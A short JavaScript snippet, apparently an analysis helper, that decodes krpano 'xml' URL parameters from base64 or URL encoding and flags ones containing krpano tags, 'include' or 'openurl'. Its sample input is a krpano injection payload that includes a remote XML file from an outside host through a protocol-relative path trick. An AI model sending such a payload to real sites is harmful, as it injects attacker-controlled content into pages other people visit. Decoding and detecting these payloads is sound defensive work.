function decodeXmlParam(xmlParam) {
  if (!xmlParam) return null;

  if (xmlParam.includes("base64,")) {
    let b64 = xmlParam.split("base64,")[1];
    b64 = b64.replace(/ /g, "+");
    try {
      return Buffer.from(b64, "base64").toString("utf-8");
    } catch (e) {}
  }

  let decoded = xmlParam;
  try {
    decoded = decodeURIComponent(xmlParam);
  } catch (e) {}

  if (decoded.includes("<krpano>") || decoded.includes("<krpano ") || decoded.includes("include") || decoded.includes("openurl")) {
    return decoded;
  }

  try {
    const rawB64Decoded = Buffer.from(xmlParam.replace(/ /g, "+"), "base64").toString("utf-8");
    if (rawB64Decoded.includes("<krpano>") || rawB64Decoded.includes("<krpano ")) {
      return rawB64Decoded;
    }
  } catch (e) {}

  return decoded;
}

const testParam = "data:gsf,%3Ckrpano%3E%3Cinclude%20url%3D%22/%5C/forms.macromedia.de/cdn/w.xml%22/%3E%3C/krpano%3E";
console.log("Decoded XML:", decodeXmlParam(testParam));
